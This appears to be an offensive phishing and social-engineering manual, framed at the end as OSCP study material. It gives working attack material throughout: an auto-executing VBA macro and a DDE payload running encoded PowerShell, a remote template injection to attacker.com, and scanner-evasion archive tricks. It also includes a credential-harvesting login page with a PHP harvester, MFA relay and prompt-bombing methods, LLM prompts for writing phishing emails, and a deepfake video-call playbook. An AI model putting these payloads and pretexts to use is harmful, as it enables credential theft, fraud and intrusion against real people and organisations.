# Phishing and Social Engineering: Complete Guide

## Table of Contents
1. [Overview](#overview)
2. [Phishing Types and Methods](#phishing-types-and-methods)
3. [Social Engineering Techniques](#social-engineering-techniques)
4. [Payload Delivery Methods](#payload-delivery-methods)
5. [Email Security Bypass](#email-security-bypass)
6. [MFA Bypass Techniques](#mfa-bypass-techniques)
7. [AI-Enhanced Phishing](#ai-enhanced-phishing)
8. [Technical Implementation](#technical-implementation)
9. [Quick Reference](#quick-reference)

---

## Overview

Phishing combines technical skills with psychological manipulation to compromise targets through deceptive communications. Success depends on creating believable pretexts, leveraging appropriate delivery methods, and bypassing security controls.

### Phishing Categories

| Type | Target Scope | Research Required | Success Rate | Example |
|------|--------------|-------------------|--------------|---------|
| **Broad Phishing** | Mass audience | Minimal | Low (1-3%) | Generic bank emails |
| **Spear Phishing** | Specific individuals | Extensive | Medium (10-20%) | Targeted employee emails |
| **Whaling** | C-level executives | Very extensive | High (30-50%) | CEO fraud |
| **Clone Phishing** | Previous recipients | Moderate | Medium (15-25%) | Fake service updates |

### Attack Objectives

```
Phishing Goal → Delivery Method → Payload Type
────────────────────────────────────────────────
Credentials   → Email link     → Cloned website
Code Execution→ Attachment     → Malicious macro
Data Theft    → Form submission→ Fake survey
MFA Bypass    → Real-time relay→ Session hijack
```

---

## Phishing Types and Methods

### Email Phishing

#### Components of Successful Email Phishing
1. **Sender Reputation**
   - Lookalike domains
   - Compromised legitimate accounts
   - Spoofed addresses
   - Trusted service impersonation

2. **Pretext Development**
   - Align with target expectations
   - Match organizational culture
   - Include realistic details
   - Create appropriate urgency

3. **Technical Elements**
   - Proper grammar and spelling
   - Matching visual design
   - Correct metadata
   - HTTPS-enabled landing pages

#### Example Email Templates

```html
<!-- HR Department Phishing -->
Subject: Updated Employee Handbook - Action Required

Dear Team,

Following recent policy changes, we've updated our employee handbook.
Please review and acknowledge by EOD Friday.

[Review Handbook] <!-- Malicious link -->

Best regards,
HR Department
```

```html
<!-- IT Security Alert -->
Subject: [URGENT] Suspicious Activity Detected

Your account showed unusual login attempts from: [Foreign Country]
Click below to secure your account immediately:

[Secure My Account] <!-- Credential harvesting link -->

IT Security Team
```

### Smishing (SMS Phishing)

#### Characteristics
- More personal/direct than email
- Limited message length
- No sender verification
- Higher open rates (98% vs 20% email)

#### Common Pretexts
```
Package Delivery: "Your package requires address confirmation: [link]"
Banking Alert: "Unusual activity detected. Verify: [link]"
2FA Bypass: "Your verification code is: [fake code]. Reply STOP to cancel"
CEO Fraud: "This is [CEO]. Need iTunes cards for client emergency. Can you help?"
```

### Vishing (Voice Phishing)

#### Techniques
1. **Caller ID Spoofing**
   - VoIP services for number masking
   - Display legitimate company numbers
   - Regional number matching

2. **Social Engineering Scripts**
   ```
   "Hi, this is [Name] from IT Support. We're updating our security
   system and need to verify your credentials. Can you confirm your
   username? Great, now for security, what's your current password?"
   ```

3. **Voice Cloning** (AI-Enhanced)
   - 3-5 minutes of audio needed
   - Real-time voice synthesis
   - Bypass voice recognition systems

### Chat/Messaging Platform Phishing

#### Target Platforms
- **Slack**: Fake workspace invites, app installation requests
- **Teams**: SharePoint links, meeting invites with malware
- **Discord**: Nitro scams, server invitations, token grabbers
- **WhatsApp**: Group invites, verification code theft

---

## Social Engineering Techniques

### Trust Building

#### Establishing Credibility
```
Initial Contact → Rapport Building → Request Escalation
─────────────────────────────────────────────────────────
Day 1: Generic greeting/introduction
Day 3: Follow-up with helpful information
Day 7: Small request (survey, feedback)
Day 14: Payload delivery (urgent request)
```

#### Trust Indicators
- Consistent communication patterns
- Familiar logos and branding
- Insider knowledge/jargon
- Previous interaction references
- Mutual connections

### Psychological Triggers

#### 1. Urgency
```
"Account will be deleted in 24 hours"
"Limited time offer expires today"
"Immediate action required"
"Security breach detected - act now"
```

#### 2. Authority
```
From: CEO@company.com
"Direct request from management"
"Compliance requirement"
"Legal department notification"
```

#### 3. Fear
```
"Suspicious activity on your account"
"You may lose access"
"Security violation detected"
"Legal action pending"
```

#### 4. Reward/Incentive
```
"Claim your $500 gift card"
"You've been selected for..."
"Exclusive invitation"
"Employee bonus notification"
```

#### 5. Curiosity
```
"See who viewed your profile"
"Confidential document shared"
"You won't believe what [Name] said"
"Private photos leaked"
```

### Pretext Development Framework

```python
# Pretext planning structure
pretext = {
    "scenario": "IT system upgrade",
    "urgency_level": "medium",
    "authority_figure": "IT Director",
    "action_required": "credential verification",
    "consequences": "account suspension",
    "timeframe": "48 hours",
    "verification": "fake helpdesk number"
}
```

---

## Payload Delivery Methods

### Malicious Office Documents

#### Macro-Based Attacks

##### Traditional VBA Macro
```vba
Sub Auto_Open()
    ' Executes when document opens
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -enc [base64_payload]"
End Sub

Sub AutoOpen()
    ' Alternative auto-execution
    Auto_Open
End Sub
```

##### Bypassing Protections
1. **Social Engineering for Macro Enable**
   ```
   "This document was created in an earlier version of Office.
   Please enable editing and content to view properly."
   ```

2. **File Format Tricks**
   - Use .docm, .xlsm extensions
   - Embed in .zip archives
   - Use less common formats (.xltm, .potm)

3. **Mark of the Web (MotW) Bypass**
   - Archive within archive (zip in zip)
   - Use container formats (ISO, VHD)
   - Network share delivery
   - CVE exploits (when available)

#### Non-Macro Office Exploits

##### DDE (Dynamic Data Exchange)
```
=cmd|'/c powershell.exe -w hidden -enc [base64_payload]'!A0
```

##### External References
```xml
<!-- In document.xml.rels -->
<Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
Target="http://attacker.com/payload.doc" TargetMode="External"/>
```

### Malicious File Types

#### Executable Alternatives
```
.scr  - Screensaver (executable)
.hta  - HTML Application
.js   - JavaScript
.vbs  - VBScript
.wsf  - Windows Script File
.bat  - Batch file
.cmd  - Command file
.ps1  - PowerShell (if execution policy allows)
.lnk  - Shortcut file (can embed commands)
.iso  - Disk image (bypasses MotW)
.vhd  - Virtual disk (bypasses MotW)
```

#### Archive-Based Delivery
```bash
# Nested archives to bypass scanning
zip payload.zip evil.exe
zip outer.zip payload.zip

# Password-protected to bypass scanning
zip -P infected malware.zip payload.exe

# Large file padding to exceed scan limits
dd if=/dev/zero of=padding.bin bs=1M count=500
zip large.zip padding.bin payload.exe
```

### Malicious Links

#### URL Obfuscation Techniques

##### 1. Homograph Attacks
```
Legitimate: microsoft.com
Homograph: rnicrosoft.com (rn looks like m)
Homograph: microѕoft.com (Cyrillic ѕ)
Homograph: micrοsoft.com (Greek ο)
```

##### 2. URL Shorteners
```
bit.ly/[id]
tinyurl.com/[id]
ow.ly/[id]
goo.gl/[id]  # Discontinued but old links work
```

##### 3. Subdomain Abuse
```
microsoft.com.attacker.com
secure-microsoft.com
microsoft-security.com
login.microsoft.attacker.com
```

##### 4. Path Obfuscation
```
https://legitimate.com@attacker.com
https://attacker.com/legitimate.com/login
https://attacker.com#legitimate.com
```

#### Credential Harvesting Sites

##### Basic HTML Template
```html
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Login</title>
    <link rel="icon" href="https://microsoft.com/favicon.ico">
</head>
<body>
    <form action="harvest.php" method="POST">
        <input type="email" name="email" placeholder="Email">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Sign In</button>
    </form>
</body>
</html>
```

##### PHP Harvester
```php
<?php
// harvest.php
$email = $_POST['email'];
$password = $_POST['password'];
$data = date('Y-m-d H:i:s') . " | " . $email . " | " . $password . "\n";
file_put_contents('creds.txt', $data, FILE_APPEND);
header('Location: https://microsoft.com'); // Redirect to real site
?>
```

---

## Email Security Bypass

### Reputation Building

#### Domain Age and Warming
```
Week 1: Register lookalike domain
Week 2: Setup SPF, DKIM, DMARC records
Week 3: Send legitimate emails to build reputation
Week 4: Gradually increase volume
Week 5: Begin phishing campaign
```

#### SPF/DKIM/DMARC Configuration
```dns
; SPF Record
v=spf1 ip4:192.0.2.1 include:_spf.google.com ~all

; DKIM Record
default._domainkey IN TXT "v=DKIM1; k=rsa; p=MIGfMA0GCS..."

; DMARC Record
_dmarc IN TXT "v=DMARC1; p=none; rua=mailto:dmarc@example.com"
```

### Bypassing Filters

#### Content Obfuscation
```html
<!-- Zero-width characters -->
Mic​rosoft (contains zero-width space)

<!-- HTML encoding -->
&#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;

<!-- Base64 images instead of links -->
<img src="data:image/png;base64,iVBORw0KG...">
```

#### Attachment Techniques
```python
# File extension confusion
"document.pdf     .exe"  # Spaces hide real extension
"document.txt.exe"        # Double extension
"document.exe.txt"        # Reversed (some clients execute)
"document.pdf.scr"        # SCR masquerading as PDF
```

### External Sender Warnings

#### Bypassing [EXTERNAL] Tags
1. **Spoofing Internal Addresses**
   ```
   From: "John Smith (External)" <john.smith@target.com>
   Reply-To: attacker@evil.com
   ```

2. **Subdomain Confusion**
   ```
   From: noreply@em.company.com  # Looks internal
   ```

3. **Display Name Tricks**
   ```
   From: "company.com IT Support" <support@attacker.com>
   ```

---

## MFA Bypass Techniques

### Real-Time Phishing

#### Token Relay Attack
```python
# Simplified flow
1. Victim enters credentials on fake site
2. Attacker's script immediately posts to real site
3. Real site returns MFA prompt
4. Fake site shows same MFA prompt to victim
5. Victim enters MFA code
6. Attacker's script submits MFA to real site
7. Attacker captures session cookie
```

#### Implementation Tools
- **Evilginx2**: Reverse proxy for credential/session theft
- **Modlishka**: Automated phishing tool with 2FA bypass
- **Muraena**: Similar to Evilginx with session management
- **CredSniper**: Python-based phishing framework

### MFA Fatigue Attacks

#### Prompt Bombing
```python
# Conceptual attack flow
while not approved:
    send_mfa_push_notification()
    sleep(5)  # Wait 5 seconds
    attempt += 1
    if attempt > 100:
        wait_and_retry_later()
```

#### Social Engineering Enhancement
```
Call target: "Hi, this is IT. We're testing our MFA system.
You should receive several prompts - please approve one to
complete the test."
```

### Technical Bypasses

#### Known Vulnerabilities
```
SS7 Attack: Intercept SMS-based codes
SIM Swapping: Control phone number
Token Prediction: Weak PRNG in some implementations
Race Conditions: Simultaneous requests bypass checks
Implementation Flaws: Backup codes, recovery flows
```

#### Backup Code Exploitation
```python
# Common backup code patterns
"12345678"  # 8 digits
"AbCd-EfGh" # Alphanumeric with separator
"XXXX-XXXX-XXXX" # Grouped format

# Brute force if pattern known
for i in range(10000000, 99999999):
    attempt_backup_code(str(i))
```

---

## AI-Enhanced Phishing

### Large Language Models (LLMs)

#### Pretext Generation
```python
prompt = """
Create a phishing email pretending to be from Microsoft IT support
about a security update. Target: finance department employees.
Include: urgency, technical details, call to action.
Tone: professional but concerning.
"""
# LLM generates convincing, personalized content
```

#### Target Research Automation
```python
# Using LLM for OSINT synthesis
research_prompt = f"""
Based on this LinkedIn profile: {profile_data}
And these tweets: {twitter_data}
Create a personalized spear-phishing pretext that would appeal
to this person's interests and responsibilities.
"""
```

### Voice Cloning

#### Requirements
- 3-5 minutes of target audio
- Clean recording (minimal background noise)
- Various speech patterns (questions, statements)

#### Common Tools
- **ElevenLabs**: Commercial service, high quality
- **Resemble.ai**: Real-time voice cloning
- **Descript**: Overdub feature for voice synthesis
- **Real-Time Voice Cloning**: Open-source implementation

### Deepfakes

#### Video Call Attacks
```
Preparation:
1. Collect target executive photos/videos
2. Train deepfake model (48-72 hours)
3. Test with various expressions/angles
4. Prepare script and responses

Execution:
1. Schedule video call with victim
2. Use OBS + deepfake for real-time video
3. Keep lighting dim "connection issues"
4. Limit call duration (5-10 minutes)
5. Request urgent action
```

#### Detection Bypass
- Lower video quality intentionally
- Claim technical difficulties
- Use busy backgrounds
- Avoid profile views
- Minimize dramatic expressions

---

## Technical Implementation

### Setting Up Infrastructure

#### Domain and Hosting
```bash
# Register lookalike domain
whois target.com  # Check original
# Register tarqet.com, target-security.com, etc.

# Setup VPS for hosting
apt update && apt upgrade
apt install apache2 certbot python3-certbot-apache

# SSL Certificate (critical for credibility)
certbot --apache -d phishing-domain.com

# Clone target website
wget -mk -np https://target.com
```

#### Email Server Configuration
```bash
# Install mail server
apt install postfix dovecot-core dovecot-imapd

# Configure SPF, DKIM, DMARC
apt install opendkim opendkim-tools
opendkim-genkey -s default -d phishing-domain.com
```

### Phishing Frameworks

#### Gophish Setup
```bash
# Installation
wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip
unzip gophish-v0.11.0-linux-64bit.zip
chmod +x gophish
./gophish

# Configure campaigns
# Access at https://localhost:3333
# Default creds: admin/gophish
```

#### Social Engineering Toolkit (SET)
```bash
# Kali Linux (pre-installed)
setoolkit

# Menu options for phishing
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
4) Site Cloner
```

#### King Phisher
```bash
# Installation
git clone https://github.com/rsmusllp/king-phisher.git
cd king-phisher
./KingPhisherServer -L INFO -f server_config.yml

# Features
- Campaign management
- Email templates
- Landing pages
- Two-factor authentication bypass
- Detailed analytics
```

### Tracking and Analytics

#### Email Tracking Pixels
```html
<!-- Invisible tracking pixel -->
<img src="https://your-server.com/track.php?id=UNIQUE_ID"
     width="1" height="1" style="display:none;">
```

```php
<?php
// track.php
$id = $_GET['id'];
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

file_put_contents('opens.log',
    "$timestamp|$id|$ip|$userAgent\n", FILE_APPEND);

// Return 1x1 transparent pixel
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
```

#### Link Tracking
```php
<?php
// redirect.php
$id = $_GET['id'];
$target = $_GET['url'];
logClick($id, $_SERVER['REMOTE_ADDR']);
header("Location: $target");
?>
```

---

## Quick Reference

### Decision Tree
```
Objective?
├─ Credentials
│  ├─ MFA Present? → Real-time relay
│  └─ No MFA → Simple harvester
├─ Code Execution
│  ├─ Office Macros allowed? → VBA payload
│  ├─ Outdated software? → CVE exploit
│  └─ Other → HTA/SCR/LNK files
└─ Information
   ├─ Form submission
   └─ Survey/questionnaire
```

### Pretext Templates

#### Generic Corporate
```
Subject Lines:
- "Action Required: Password Expiry Notice"
- "Updated Security Policy - Please Review"
- "IT Maintenance: Verify Your Account"
- "Suspicious Activity Detected"
- "New Employee Benefits Portal"
```

#### Industry-Specific
```
Healthcare: "HIPAA Compliance Update Required"
Finance: "Quarterly Report - Confidential"
Education: "Student Records System Update"
Retail: "Inventory System Maintenance"
Government: "Security Clearance Renewal"
```

### Testing Checklist

#### Pre-Campaign
- [ ] Domain registered and aged
- [ ] SPF/DKIM/DMARC configured
- [ ] SSL certificates installed
- [ ] Website clone completed
- [ ] Email templates created
- [ ] Tracking pixels embedded
- [ ] Infrastructure tested

#### During Campaign
- [ ] Monitor email delivery rates
- [ ] Track open rates
- [ ] Monitor click-through rates
- [ ] Capture credentials
- [ ] Document successful compromises
- [ ] Maintain operational security

#### Post-Campaign
- [ ] Compile statistics
- [ ] Document successful techniques
- [ ] Clean up infrastructure
- [ ] Prepare report
- [ ] Debrief with client

### Common Mistakes to Avoid

1. **Technical Mistakes**
   - No HTTPS on landing pages
   - Broken images/links in emails
   - Wrong timezone in email headers
   - Mismatched sender/reply addresses

2. **Social Engineering Mistakes**
   - Too much urgency (suspicious)
   - Wrong organizational terminology
   - Grammar/spelling errors
   - Inappropriate tone for company culture

3. **Operational Mistakes**
   - Using same infrastructure repeatedly
   - Not testing emails before sending
   - Poor timing (nights/weekends)
   - Targeting wrong departments

### OSCP Exam Relevance

While full phishing campaigns are unlikely in the OSCP exam, understanding these concepts helps with:

1. **Client-side attacks** in the exam
2. **Social engineering** understanding for reports
3. **Attack chain** comprehension
4. **Credential harvesting** techniques
5. **Bypass techniques** for security controls

Remember: Always ensure proper authorization before conducting any phishing activities. These techniques should only be used in authorized penetration tests with explicit written permission.

---

*Last Updated: Comprehensive Phishing and Social Engineering Guide*